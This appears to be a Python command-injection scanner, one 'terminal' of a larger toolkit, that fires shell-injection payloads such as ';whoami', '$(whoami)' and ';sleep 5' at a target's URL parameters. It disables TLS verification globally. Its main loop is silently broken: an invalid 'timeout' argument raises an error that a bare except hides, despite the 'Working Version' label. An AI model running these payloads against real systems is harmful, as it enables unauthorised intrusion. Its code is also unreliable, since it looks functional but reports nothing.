#!/usr/bin/env python3
"""TERMINAL 3: RCE SCANNER - Working Version"""
import os, sys, json, urllib.request, urllib.parse, urllib.error
from datetime import datetime
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    workspace = sys.argv[2] if len(sys.argv) > 2 else "/tmp/scan"
    
    print(f"[+] TERMINAL 3: RCE Scanner Started")
    print(f"[+] Target: {target}")
    
    os.makedirs(f"{workspace}/results", exist_ok=True)
    result_file = f"{workspace}/results/rce_scan.json"
    
    results = {"terminal": 3, "name": "RCE Scanner", "target": target,
        "start_time": datetime.now().isoformat(), "status": "running",
        "vulnerabilities": [], "tested_params": [], "log": ""}
    
    log_lines = []
    def log(msg):
        print(msg)
        log_lines.append(msg)
    
    payloads = [";whoami", "|whoami", "`whoami`", "$(whoami)", ";id", "|id", ";uname -a", "|uname -a"]
    test_params = ['cmd', 'exec', 'command', 'run', 'ping', 'query', 'ip', 'host']
    test_urls = [f"http://{target}/", f"http://{target}/test", f"http://{target}/api", f"http://{target}/cgi-bin/test.cgi", f"http://{target}/ping"]
    
    log("[*] Testing for Command Injection...")
    vuln_found = False
    
    for base_url in test_urls:
        for param in test_params:
            for payload in payloads[:6]:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                    with urllib.request.urlopen(req) as response:
                        content = response.read().decode('utf-8', errors='ignore').lower()
                        indicators = [('root:', 'root user'), ('www-data', 'www-data'), ('daemon:', 'daemon'), ('bin/bash', 'bash'), ('uid=', 'id output'), ('linux', 'linux system')]
                        for indicator, desc in indicators:
                            if indicator in content and len(content) < 500:
                                if not vuln_found:
                                    log(f"[!] COMMAND INJECTION FOUND!")
                                    vuln_found = True
                                results['vulnerabilities'].append({'type': 'Command Injection', 'severity': 'Critical', 'url': test_url, 'param': param, 'payload': payload, 'evidence': f'{desc}: {content[:100]}'})
                                log(f"  [+] {desc} detected")
                                break
                except urllib.error.HTTPError as e:
                    if e.code == 500:
                        log(f"[!] Server error (possible RCE): {param}")
                        results['vulnerabilities'].append({'type': 'Possible Command Injection', 'severity': 'High', 'url': test_url, 'param': param, 'payload': payload, 'evidence': 'Server 500 error'})
                except: pass
    
    import time
    log("[*] Testing for blind RCE (time delays)...")
    for payload in [";sleep 5", "|sleep 5"]:
        test_url = f"http://{target}/?cmd={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            urllib.request.urlopen(test_url, timeout=8)
            elapsed = time.time() - start
            if elapsed > 4:
                log(f"[!] TIME DELAY - Blind RCE!")
                results['vulnerabilities'].append({'type': 'Blind Command Injection', 'severity': 'Critical', 'url': test_url, 'payload': payload, 'evidence': f'Delay: {elapsed:.2f}s'})
        except: pass
    
    results['status'] = 'completed'
    results['end_time'] = datetime.now().isoformat()
    results['log'] = '\n'.join(log_lines)
    
    with open(result_file, 'w') as f:
        json.dump(results, f, indent=2)
    log(f"[+] RCE complete! {len(results['vulnerabilities'])} vulns found")

if __name__ == '__main__':
    main()
